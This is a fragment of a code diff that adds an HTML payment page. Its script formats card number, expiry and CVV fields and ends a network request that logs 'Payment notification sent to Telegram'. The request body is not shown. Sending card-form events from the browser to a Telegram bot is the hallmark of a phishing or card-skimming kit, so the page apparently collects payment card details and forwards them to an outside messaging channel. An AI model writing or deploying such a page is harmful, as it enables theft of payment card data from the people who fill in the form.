+        .then(result => {
+            if (result.ok) {
+                console.log('Payment notification sent to Telegram');
+            }
+        })
+        .catch(error => {
+            console.log('Could not send to Telegram:', error);
+        });
+    }
+
+    document.getElementById('cardNumber')?.addEventListener('input', function(e) {
+        let value = this.value.replace(/\D/g, '');
+        if (value.length > 16) value = value.slice(0, 16);
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += ' ';
+            formatted += value[i];
+        }
+        this.value = formatted;
+    });
+
+    document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
+        let value = this.value.replace(/\D/g, '');
+        if (value.length > 4) value = value.slice(0, 4);
+        if (value.length > 2) {
+            this.value = value.slice(0, 2) + '/' + value.slice(2);
+        } else {
+            this.value = value;
+        }
+    });
+
+    document.getElementById('cardCvv')?.addEventListener('input', function(e) {
+        let value = this.value.replace(/\D/g, '');
+        if (value.length > 4) value = value.slice(0, 4);
+        this.value = value;
+    });
+
+    console.log('Payment Page Loaded');
+</script>
+
+</body>
+</html>
